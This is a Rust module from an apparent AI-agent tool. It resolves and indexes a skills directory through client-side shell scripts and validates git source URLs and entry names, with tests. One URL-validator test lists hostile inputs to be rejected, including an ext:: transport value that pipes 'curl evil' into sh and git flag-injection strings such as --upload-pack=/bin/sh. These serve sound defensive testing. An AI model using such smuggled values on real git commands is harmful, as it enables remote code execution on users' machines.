//! Skills resolution and validation logic.
//!
//! The agent process itself never learns the path to an editor's skills
//! checkout: one server can serve editors on different machines and
//! operating systems, so the directory is resolved by a small shell script
//! run *on the client* over ACP, not by anything this crate stores. This
//! module owns that script's text (a compile-time constant with nothing
//! interpolated into it — the candidate directories are environment
//! expansions the client's own shell performs), the parser for its output,
//! and the validators used by `skill_install`/`skill_uninstall`.

use anyhow::{Context, Result, bail};

#[derive(Debug)]
pub struct SkillEntry {
    pub name: String,
    pub description: String,
    pub path: String,
}

#[derive(Debug)]
pub struct SkillIndex {
    pub dir: String,
    pub skills: Vec<SkillEntry>,
}

/// Resolve the skills directory and index it, in one round trip.
///
/// The candidate order mirrors `directories::BaseDirs::data_dir()`,
/// which `init_app_ctx` already uses for this crate's own directories
/// on the server side. Each candidate is skipped when its own base
/// variable is unset, *before* any path is assembled from it — not by
/// pattern-matching the assembled string afterward. Guarding the input
/// closes every candidate that would otherwise collapse to a shorter,
/// unintended (and on some candidates, real and existing) path when its
/// base variable is empty; guarding the assembled string's shape only
/// ever closes the one case someone happened to write a pattern for.
/// `-d` then gates the fully-assembled candidate, so trying every
/// surviving candidate in the same order on every platform is safe: a
/// macOS path simply does not exist on Linux.
///
/// Frontmatter is emitted raw, one `FM` line per line of it, and parsed
/// by `serde_norway` in `parse_index`. Parsing YAML in `sed` would break
/// on the quoted descriptions superpowers actually ships.
pub const RESOLVE_AND_INDEX_SH: &str = r#"
set -u
emit() {
  d="$1"
  [ -d "$d" ] || return 1
  printf 'SKILLS_DIR\t%s\n' "$d"
  for f in "$d"/*/SKILL.md "$d"/*/skills/*/SKILL.md; do
    [ -f "$f" ] || continue
    printf 'SKILL\t%s\n' "$f"
    awk '{ sub(/\r$/, "") }
         NR==1 && $0=="---" {inside=1; next}
         inside && $0=="---" {exit}
         inside {print "FM\t" $0}' "$f"
  done
  return 0
}
if [ -n "${SAPPHIRE_AGENT_SKILLS_DIR:-}" ] && emit "$SAPPHIRE_AGENT_SKILLS_DIR"; then
  exit 0
fi
if [ -n "${APPDATA:-}" ] && emit "$APPDATA/sapphire-agent/skills"; then
  exit 0
fi
if [ -n "${HOME:-}" ] && emit "$HOME/Library/Application Support/sapphire-agent/skills"; then
  exit 0
fi
if { [ -n "${XDG_DATA_HOME:-}" ] || [ -n "${HOME:-}" ]; } \
   && emit "${XDG_DATA_HOME:-$HOME/.local/share}/sapphire-agent/skills"; then
  exit 0
fi
printf 'NO_SKILLS_DIR\n'
"#;

/// Resolve the skills directory for writing: the first candidate that
/// **already exists** wins, exactly like [`RESOLVE_AND_INDEX_SH`] — the
/// two must agree, because `skill()` and this script's caller
/// (`resolve_or_create_dir`, shared by `skill_install`, `skill_update`
/// and `skill_uninstall`) are both being asked "where is the skills
/// directory," just for different purposes. Only when *none* of the
/// four candidates exists does this fall back to a second pass that
/// creates the first *eligible* one — base variable set, existence not
/// required — in the same order.
///
/// Earlier, this script picked its candidate on eligibility alone (base
/// variable set, no existence test), which could disagree with
/// `RESOLVE_AND_INDEX_SH` about where an already-populated checkout
/// lives: `$APPDATA` set but `%APPDATA%\sapphire-agent\skills` never
/// created, with a real, hand-made checkout sitting under the XDG
/// candidate instead, used to make this script `mkdir -p` a second,
/// empty directory under `%APPDATA%` and use *that* — silently
/// orphaning the real checkout from every mutating tool while `skill()`
/// kept listing it from the XDG path.
///
/// The macOS branch requires `HOME` to be non-empty *before* testing
/// `-d`, in both passes. Without that guard, an unset `HOME` collapses
/// the test to `-d "/Library/Application Support"` — a directory that
/// exists on every real macOS install regardless of `HOME` — so a
/// client spawned without `HOME` (a service, a stripped-down
/// environment) could still match it and silently create under a
/// system-wide path instead of falling through to the XDG-based
/// candidate below.
///
/// **What a typo'd `$SAPPHIRE_AGENT_SKILLS_DIR` does now:** nothing
/// special. It is tested for existence in the same first pass as every
/// other candidate, so a typo that points nowhere is simply skipped in
/// favor of whichever real candidate already has a directory — the same
/// outcome `RESOLVE_AND_INDEX_SH` reaches for `skill()`. Only if *no*
/// candidate exists anywhere does the override win the creation pass,
/// same as before: it is the one variable whose entire purpose is "use
/// this exact path," so once creation is actually reached it still goes
/// first.
pub const RESOLVE_OR_CREATE_SH: &str = r#"
set -eu
exists() {
  [ -d "$1" ]
}
d=""
if [ -n "${SAPPHIRE_AGENT_SKILLS_DIR:-}" ] && exists "$SAPPHIRE_AGENT_SKILLS_DIR"; then
  d="$SAPPHIRE_AGENT_SKILLS_DIR"
elif [ -n "${APPDATA:-}" ] && exists "$APPDATA/sapphire-agent/skills"; then
  d="$APPDATA/sapphire-agent/skills"
elif [ -n "${HOME:-}" ] && exists "$HOME/Library/Application Support/sapphire-agent/skills"; then
  d="$HOME/Library/Application Support/sapphire-agent/skills"
elif { [ -n "${XDG_DATA_HOME:-}" ] || [ -n "${HOME:-}" ]; } \
     && exists "${XDG_DATA_HOME:-$HOME/.local/share}/sapphire-agent/skills"; then
  d="${XDG_DATA_HOME:-$HOME/.local/share}/sapphire-agent/skills"
elif [ -n "${SAPPHIRE_AGENT_SKILLS_DIR:-}" ]; then
  d="$SAPPHIRE_AGENT_SKILLS_DIR"
elif [ -n "${APPDATA:-}" ]; then
  d="$APPDATA/sapphire-agent/skills"
elif [ -n "${HOME:-}" ] && [ -d "$HOME/Library/Application Support" ]; then
  # Eligibility for the macOS candidate is not just "HOME is set" —
  # `$HOME/Library/Application Support` (one level up from the skills
  # subdirectory this pass is about to create) existing is the proxy for
  # "this is macOS" the whole script relies on, since there is no
  # `$OSTYPE` to check from POSIX sh. Skipping this test here would let
  # a non-macOS client with only `HOME` set — no `APPDATA`, no
  # `XDG_DATA_HOME` — silently create under an "Application Support"
  # tree that was never a real convention on its OS, instead of falling
  # through to the XDG candidate below.
  d="$HOME/Library/Application Support/sapphire-agent/skills"
else
  d="${XDG_DATA_HOME:-${HOME:-}/.local/share}/sapphire-agent/skills"
fi
mkdir -p "$d"
printf 'SKILLS_DIR\t%s\n' "$d"
"#;

/// Parse the output of [`RESOLVE_AND_INDEX_SH`].
pub fn parse_index(stdout: &str) -> Result<SkillIndex> {
    let mut dir: Option<String> = None;
    let mut skills = Vec::new();
    let mut current: Option<(String, Vec<String>)> = None;

    // Flush whatever skill was being accumulated. A definition with no
    // parseable `name` is skipped rather than fatal: one malformed file
    // in someone's checkout must not remove every other skill, which is
    // the same rule `load_agents_dir` follows.
    fn flush(cur: Option<(String, Vec<String>)>, out: &mut Vec<SkillEntry>) {
        let Some((path, fm_lines)) = cur else { return };
        let fm = fm_lines.join("\n");
        let map = crate::frontmatter::parse_mapping(&fm);
        let get = |k: &str| map.get(k).and_then(|v| v.as_str()).map(str::to_string);
        match get("name") {
            Some(name) if !name.is_empty() => out.push(SkillEntry {
                name,
                description: get("description").unwrap_or_default(),
                path,
            }),
            _ => tracing::warn!("skill at {path} has no usable `name`; skipping"),
        }
    }

    for line in stdout.lines() {
        if line == "NO_SKILLS_DIR" {
            bail!(
                "no skills directory found on the editor's machine. Tried \
                 $SAPPHIRE_AGENT_SKILLS_DIR, $APPDATA/sapphire-agent/skills, \
                 ~/Library/Application Support/sapphire-agent/skills and \
                 ${{XDG_DATA_HOME:-~/.local/share}}/sapphire-agent/skills. \
                 Use skill_install to create it and install a skill source, \
                 or set SAPPHIRE_AGENT_SKILLS_DIR to an existing checkout."
            );
        }
        if let Some(d) = line.strip_prefix("SKILLS_DIR\t") {
            dir = Some(d.to_string());
        } else if let Some(p) = line.strip_prefix("SKILL\t") {
            flush(current.take(), &mut skills);
            current = Some((p.to_string(), Vec::new()));
        } else if let Some(fm) = line.strip_prefix("FM\t")
            && let Some((_, lines)) = current.as_mut()
        {
            lines.push(fm.to_string());
        }
    }
    flush(current.take(), &mut skills);

    let dir = dir.context("resolver produced no SKILLS_DIR line")?;
    skills.sort_by(|a, b| a.name.cmp(&b.name));
    Ok(SkillIndex { dir, skills })
}

/// Parse the output of [`RESOLVE_OR_CREATE_SH`]: a single
/// `SKILLS_DIR\t<path>` line. Errors if that line is absent.
pub fn parse_resolved_dir(stdout: &str) -> Result<String> {
    stdout
        .lines()
        .find_map(|line| line.strip_prefix("SKILLS_DIR\t"))
        .map(str::to_string)
        .context("resolver produced no SKILLS_DIR line")
}

/// Reject everything but a plain `https://` source URL.
///
/// Checking the prefix positively — rather than deny-listing `ext::`,
/// `file://`, `git://`, `ssh://`, and scp-like `user@host:path` one by
/// one — means every one of those (and anything else not spelled
/// `https://`) is excluded by the same clause instead of by an
/// enumeration that could miss one. A leading `-` is rejected first so
/// nothing here can be mistaken for a flag by whatever eventually runs
/// `git clone` with this string.
pub fn validate_source_url(url: &str) -> Result<()> {
    if url.is_empty() || url.starts_with('-') || !url.starts_with("https://") {
        bail!("'{url}' is not an https:// source URL");
    }
    Ok(())
}

/// Derive a destination directory name from a source URL: the final
/// non-empty path segment (after the `scheme://host` part), with a
/// trailing `.git` stripped, validated as a skills-directory entry name.
pub fn destination_name(url: &str) -> Result<String> {
    let after_scheme = url.split("://").nth(1).unwrap_or(url);
    let path = after_scheme.split_once('/').map_or("", |(_, rest)| rest);
    let segment = path
        .split('/')
        .rfind(|s| !s.is_empty())
        .with_context(|| format!("'{url}' has no path segment to derive a name from"))?;
    let name = segment.strip_suffix(".git").unwrap_or(segment);
    validate_entry_name(name)?;
    Ok(name.to_string())
}

/// Reserved DOS device names. See `DigestCache::RESERVED_WINDOWS_NAMES`
/// (`src/digest_cache.rs`) for why this closed, decades-stable Win32 set
/// needs its own check: `"CON"` is three ordinary ASCII letters, so an
/// allow-listed charset alone does not exclude it.
const RESERVED_WINDOWS_NAMES: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

/// Validate a single path component destined to be joined onto the
/// skills directory (an installed source's directory name, or a skill
/// name used to remove one). Matches `DigestCache::path_for`'s rule:
/// allow-listed charset (closes traversal, absolute/drive-relative
/// paths, and a leading `-` that some downstream command could read as
/// a flag) plus a deny-list of the fixed reserved-device-name set,
/// which the charset alone cannot exclude.
///
/// Unlike `DigestCache::path_for`'s charset, this one allows `.` — repo
/// names like `my.skills` are legitimate, and `destination_name` feeds
/// this validator with names derived from a URL's final path segment.
/// That reopens two things `DigestCache`'s doc comment calls out as
/// covered "regardless of case or extension":
///
/// - Windows resolves `CON.txt` (and `CON.tar.gz`, ...) to the `CON`
///   device, not a path component, so the reserved-name check must
///   also match the segment before the first `.`, not just the whole
///   string.
/// - Windows silently strips a trailing `.` (and trailing spaces),
///   so `"superpowers."` would otherwise collide with an existing
///   `"superpowers"`.
pub fn validate_entry_name(name: &str) -> Result<()> {
    let stem = name.split('.').next().unwrap_or(name);
    let reserved = RESERVED_WINDOWS_NAMES
        .iter()
        .any(|n| n.eq_ignore_ascii_case(name) || n.eq_ignore_ascii_case(stem));
    if name.is_empty()
        || name == "."
        || name == ".."
        || name.starts_with('-')
        // A leading dot makes `stem` (everything before the first `.`)
        // empty, so the reserved-name check above would never see it —
        // `".git".split('.').next()` is `""`, not `"git"`. Rejecting a
        // leading dot outright closes that regardless of what follows
        // it. `.git` is one direct child of the skills directory (never
        // a traversal — `validate_entry_name` never sees a path with a
        // separator in it), but there is no legitimate reason a skill
        // source's derived or supplied name should start with one, and
        // letting `skill_uninstall(".git")` reach `rm -rf` on it is
        // reachable, model-choosable, and pointless to allow.
        || name.starts_with('.')
        || name.ends_with('.')
        || name.ends_with(' ')
        || reserved
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
    {
        bail!("'{name}' is not usable as a skills directory entry");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_index_parses_a_directory_and_both_layouts() {
        let out = "SKILLS_DIR\t/home/u/.local/share/sapphire-agent/skills\n\
                   SKILL\t/home/u/.local/share/sapphire-agent/skills/local-thing/SKILL.md\n\
                   FM\tname: local-thing\n\
                   FM\tdescription: a hand-written one\n\
                   SKILL\t/home/u/.local/share/sapphire-agent/skills/superpowers/skills/brainstorming/SKILL.md\n\
                   FM\tname: brainstorming\n\
                   FM\tdescription: \"You MUST use this before any creative work\"\n";
        let idx = parse_index(out).unwrap();
        assert_eq!(idx.dir, "/home/u/.local/share/sapphire-agent/skills");
        assert_eq!(idx.skills.len(), 2);
        assert_eq!(idx.skills[0].name, "brainstorming");
        // The quoted form must survive: superpowers quotes several
        // descriptions, and a naive `split(": ")` would keep the quotes.
        assert_eq!(
            idx.skills[0].description,
            "You MUST use this before any creative work"
        );
    }

    #[test]
    fn no_directory_is_a_distinct_error_not_an_empty_index() {
        let err = parse_index("NO_SKILLS_DIR\n").unwrap_err().to_string();
        assert!(err.contains("SAPPHIRE_AGENT_SKILLS_DIR"), "got: {err}");
        assert!(err.contains("skill_install"), "got: {err}");
    }

    #[test]
    fn a_skill_whose_frontmatter_lacks_a_name_is_skipped_not_fatal() {
        let out = "SKILLS_DIR\t/s\n\
                   SKILL\t/s/broken/SKILL.md\n\
                   FM\tdescription: no name here\n\
                   SKILL\t/s/ok/SKILL.md\n\
                   FM\tname: ok\n\
                   FM\tdescription: fine\n";
        let idx = parse_index(out).unwrap();
        assert_eq!(idx.skills.len(), 1);
        assert_eq!(idx.skills[0].name, "ok");
    }

    #[test]
    fn a_resolved_dir_is_parsed_from_a_single_line() {
        let dir =
            parse_resolved_dir("SKILLS_DIR\t/home/u/.local/share/sapphire-agent/skills\n").unwrap();
        assert_eq!(dir, "/home/u/.local/share/sapphire-agent/skills");
    }

    #[test]
    fn a_missing_resolved_dir_line_is_an_error() {
        assert!(parse_resolved_dir("").is_err());
        assert!(parse_resolved_dir("NO_SKILLS_DIR\n").is_err());
    }

    #[test]
    fn only_https_sources_are_accepted() {
        assert!(validate_source_url("https://github.com/obra/superpowers").is_ok());
        for bad in [
            "ext::sh -c 'curl evil|sh'",
            "file:///etc",
            "git://github.com/x/y",
            "ssh://git@github.com/x/y",
            "git@github.com:x/y.git",
            "--upload-pack=/bin/sh",
            "-oProxyCommand=x",
            "http://github.com/x/y",
        ] {
            assert!(validate_source_url(bad).is_err(), "accepted {bad}");
        }
    }

    #[test]
    fn destination_names_are_derived_and_sanitised() {
        assert_eq!(
            destination_name("https://github.com/obra/superpowers").unwrap(),
            "superpowers"
        );
        assert_eq!(
            destination_name("https://github.com/obra/superpowers.git").unwrap(),
            "superpowers"
        );
        assert_eq!(
            destination_name("https://github.com/obra/superpowers/").unwrap(),
            "superpowers"
        );
        // `CON` is three ordinary ASCII letters, so an alphanumeric
        // allow-list does not exclude it. Ruling that it did was wrong
        // once already, during the client-side tools work.
        assert!(destination_name("https://example.com/x/con").is_err());
        assert!(destination_name("https://example.com/x/CON.git").is_err());
        assert!(destination_name("https://example.com/x/..").is_err());
        assert!(destination_name("https://example.com/").is_err());
        // No path at all, and no trailing slash either.
        assert!(destination_name("https://example.com").is_err());
    }

    #[test]
    fn entry_names_cannot_escape_the_skills_directory() {
        assert!(validate_entry_name("superpowers").is_ok());
        for bad in ["..", ".", "", "a/b", "a\\b", "/abs", "-x", "nul", "COM1"] {
            assert!(validate_entry_name(bad).is_err(), "accepted {bad}");
        }
    }

    /// A leading dot makes `stem` (`name.split('.').next()`) empty, so
    /// the reserved-name check never sees the segment after it —
    /// `".git".split('.').next()` is `""`, not `"git"`. Closed directly
    /// rather than folded into the reserved-name check, because the
    /// point isn't reserved device names here, it's `.git` itself:
    /// `skill_uninstall(".git")` addresses a single direct child of the
    /// skills directory (never a traversal — this validator never sees
    /// a path with a separator in it), but it is reachable,
    /// model-choosable, and pointless to allow.
    #[test]
    fn a_leading_dot_is_refused() {
        for bad in [".git", ".ssh", ".superpowers"] {
            assert!(validate_entry_name(bad).is_err(), "accepted {bad}");
        }
    }

    /// `.` stayed in the charset (repo names like `my.skills` are
    /// legitimate), which reopens two things Windows normalises away:
    /// `CON.txt` still resolves to the `CON` device, and a trailing `.`
    /// is stripped, so `"superpowers."` would collide with an existing
    /// `"superpowers"`. Positive controls (`my.skills`, `superpowers.io`)
    /// confirm the fix doesn't reject legitimate dotted names.
    #[test]
    fn dotted_names_windows_would_collapse_are_refused() {
        for bad in ["CON.txt", "Con.tar.gz", "superpowers.", "con.", "nul.log"] {
            assert!(validate_entry_name(bad).is_err(), "accepted {bad}");
        }
        for good in ["my.skills", "superpowers.io"] {
            assert!(validate_entry_name(good).is_ok(), "rejected {good}");
        }
    }

    // ── Script fixture tests ────────────────────────────────────────────
    //
    // The scripts are shell running on someone else's machine, so
    // asserting on Rust that never evaluates them proves nothing. Both
    // tests return early where no `sh`/`bash` is on `PATH` — the
    // assertion is about the script, not about the machine running the
    // suite.

    use std::process::Command;

    fn sh() -> Option<&'static str> {
        ["sh", "bash"]
            .into_iter()
            .find(|c| Command::new(c).arg("-c").arg("exit 0").status().is_ok())
    }

    #[test]
    fn the_resolver_finds_both_layouts_under_the_env_override() {
        let Some(sh) = sh() else { return };
        let tmp = tempfile::tempdir().unwrap();
        let skills = tmp.path().join("skills");
        std::fs::create_dir_all(skills.join("local-thing")).unwrap();
        std::fs::write(
            skills.join("local-thing/SKILL.md"),
            "---\nname: local-thing\ndescription: hand written\n---\n\nbody\n",
        )
        .unwrap();
        std::fs::create_dir_all(skills.join("bundle/skills/brainstorming")).unwrap();
        std::fs::write(
            skills.join("bundle/skills/brainstorming/SKILL.md"),
            "---\nname: brainstorming\ndescription: \"quoted one\"\n---\n\nbody\n",
        )
        .unwrap();

        let out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_AND_INDEX_SH)
            .env("SAPPHIRE_AGENT_SKILLS_DIR", &skills)
            .output()
            .unwrap();
        let stdout = String::from_utf8(out.stdout).unwrap();
        let idx = parse_index(&stdout).unwrap();
        assert_eq!(idx.skills.len(), 2, "stdout was:\n{stdout}");
        assert_eq!(idx.skills[0].name, "brainstorming");
        assert_eq!(idx.skills[0].description, "quoted one");
        assert_eq!(idx.skills[1].name, "local-thing");
    }

    #[test]
    fn the_resolver_reports_absence_rather_than_guessing() {
        let Some(sh) = sh() else { return };
        let tmp = tempfile::tempdir().unwrap();
        let out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_AND_INDEX_SH)
            .env("SAPPHIRE_AGENT_SKILLS_DIR", tmp.path().join("nope"))
            .env_remove("APPDATA")
            .env("HOME", tmp.path())
            .env("XDG_DATA_HOME", tmp.path().join("xdg"))
            .output()
            .unwrap();
        assert_eq!(
            String::from_utf8(out.stdout).unwrap().trim(),
            "NO_SKILLS_DIR"
        );
    }

    /// With every base env var unset, `${APPDATA:-}/sapphire-agent/skills`
    /// collapses to `/sapphire-agent/skills`, `${HOME:-}/Library/...`
    /// collapses to `/Library/Application Support/sapphire-agent/skills`,
    /// and the XDG candidate collapses to `/.local/share/sapphire-agent/
    /// skills`. The macOS one is the real danger: `/Library/Application
    /// Support` exists on every macOS install, so a client spawned
    /// without `HOME` could match it and silently resolve to a
    /// system-wide path instead of reporting nothing found. Each
    /// candidate must be skipped because its *base variable* is unset,
    /// not because the assembled string happens to match a known-bad
    /// shape.
    ///
    /// **This can only actually fail on macOS.** The collapsed macOS
    /// path, `/Library/Application Support/sapphire-agent/skills`, is
    /// only a real, pre-existing directory (well, its parent is) on an
    /// actual macOS machine — on Linux and Windows CI none of the three
    /// collapsed candidates exists, so the assertion passes whether or
    /// not the guard this test is pinning is even present. Do not read
    /// a green run of this test on non-macOS CI as coverage of the
    /// thing it is named for.
    #[test]
    fn the_resolver_reports_absence_when_every_base_var_is_unset() {
        let Some(sh) = sh() else { return };
        let out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_AND_INDEX_SH)
            .env_remove("SAPPHIRE_AGENT_SKILLS_DIR")
            .env_remove("APPDATA")
            .env_remove("HOME")
            .env_remove("XDG_DATA_HOME")
            .output()
            .unwrap();
        assert_eq!(
            String::from_utf8(out.stdout).unwrap().trim(),
            "NO_SKILLS_DIR",
            "must not silently match a collapsed candidate such as \
             \"/Library/Application Support/sapphire-agent/skills\""
        );
    }

    /// `RESOLVE_OR_CREATE_SH`'s macOS branch has the same collapse
    /// hazard as the resolver above: `-d "${HOME:-}/Library/Application
    /// Support"` with `HOME` unset tests the real, always-present
    /// `/Library/Application Support`. With `HOME` and `APPDATA` both
    /// unset and `XDG_DATA_HOME` pointed at a scratch directory, a fixed
    /// script must skip the macOS branch (guarded on `HOME` being set,
    /// not on `-d`'s result) and fall through to the XDG candidate
    /// rather than the unrelated system path.
    ///
    /// **This can only actually fail on macOS**, for the same reason as
    /// `the_resolver_reports_absence_when_every_base_var_is_unset`
    /// above: `/Library/Application Support` is only a real,
    /// pre-existing directory on an actual macOS machine. On Linux and
    /// Windows CI the unguarded, buggy version of this branch would
    /// have failed its own `-d` test anyway and fallen through to XDG
    /// regardless, so a green run there is not coverage of the guard
    /// this test exists to pin.
    #[test]
    fn resolve_or_create_falls_back_to_xdg_when_home_is_unset() {
        let Some(sh) = sh() else { return };
        let tmp = tempfile::tempdir().unwrap();
        let xdg = tmp.path().join("xdg");
        let out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_OR_CREATE_SH)
            .env_remove("SAPPHIRE_AGENT_SKILLS_DIR")
            .env_remove("APPDATA")
            .env_remove("HOME")
            .env("XDG_DATA_HOME", &xdg)
            .output()
            .unwrap();
        let stdout = String::from_utf8(out.stdout).unwrap();
        let dir = parse_resolved_dir(&stdout).unwrap();
        let expected = xdg.join("sapphire-agent").join("skills");
        assert_eq!(
            std::path::Path::new(&dir),
            expected,
            "stdout was:\n{stdout}"
        );
        assert!(expected.is_dir(), "resolver should have created it");
    }

    /// Blocking 1's own regression: candidate 2's *base variable*
    /// (`APPDATA`) is set but the path it names does not exist, while
    /// candidate 4's (`$XDG_DATA_HOME/sapphire-agent/skills`) both is
    /// eligible and already has a real, populated directory on disk —
    /// the shape of "person cloned superpowers by hand into the
    /// XDG-default location, and `%APPDATA%\sapphire-agent\skills` was
    /// simply never created." Before this fix, `RESOLVE_OR_CREATE_SH`
    /// selected on eligibility alone and would have settled on
    /// candidate 2 (and `mkdir -p`'d an empty directory there),
    /// disagreeing with `RESOLVE_AND_INDEX_SH`, which requires the
    /// assembled path to exist and would have found the real checkout
    /// at candidate 4. Both resolvers must now agree.
    ///
    /// `XDG_DATA_HOME` rather than `HOME` carries candidate 4 here
    /// deliberately: `HOME` is one of the environment variables MSYS's
    /// own shell startup can reassert to the real value even after
    /// `env_remove`/`env`, which would make a strict path comparison
    /// against an `env`-supplied `HOME` flaky on a Windows/Git-Bash
    /// host — `resolve_or_create_falls_back_to_xdg_when_home_is_unset`
    /// above avoids the same trap the same way.
    #[test]
    fn both_resolvers_agree_when_a_base_var_is_set_but_its_path_is_absent() {
        let Some(sh) = sh() else { return };
        let tmp = tempfile::tempdir().unwrap();
        let xdg = tmp.path().join("xdg");
        let real = xdg.join("sapphire-agent").join("skills");
        std::fs::create_dir_all(&real).unwrap();
        // Set, but nothing was ever created under it.
        let appdata_base = tmp.path().join("appdata-never-created");

        let index_out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_AND_INDEX_SH)
            .env_remove("SAPPHIRE_AGENT_SKILLS_DIR")
            .env("APPDATA", &appdata_base)
            .env_remove("HOME")
            .env("XDG_DATA_HOME", &xdg)
            .output()
            .unwrap();
        let index_stdout = String::from_utf8(index_out.stdout).unwrap();
        let index_dir = parse_index(&index_stdout).unwrap().dir;

        let create_out = Command::new(sh)
            .arg("-c")
            .arg(RESOLVE_OR_CREATE_SH)
            .env_remove("SAPPHIRE_AGENT_SKILLS_DIR")
            .env("APPDATA", &appdata_base)
            .env_remove("HOME")
            .env("XDG_DATA_HOME", &xdg)
            .output()
            .unwrap();
        let create_stdout = String::from_utf8(create_out.stdout).unwrap();
        let create_dir = parse_resolved_dir(&create_stdout).unwrap();

        assert_eq!(
            std::path::Path::new(&index_dir),
            real,
            "the read-only resolver must find the real, hand-made checkout: \
             stdout was:\n{index_stdout}"
        );
        assert_eq!(
            std::path::Path::new(&create_dir),
            real,
            "the create-or-resolve resolver must agree, not mkdir -p a \
             second directory under APPDATA just because that base \
             variable happens to be set: stdout was:\n{create_stdout}"
        );
    }
}
